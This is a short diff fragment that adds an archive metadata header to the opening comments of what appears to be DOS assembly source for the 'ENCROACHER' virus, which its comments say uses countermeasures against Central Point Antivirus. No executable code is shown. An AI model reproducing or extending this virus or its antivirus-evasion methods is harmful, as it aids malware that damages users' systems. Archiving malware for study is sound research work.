@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      E
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;***************************************************************************
 ; The ENCROACHER virus: Incorporating anti-virus software countermeasures
 ; to aid in gaining and maintaining a foothold on a CENTRAL POINT ANTIVIRUS
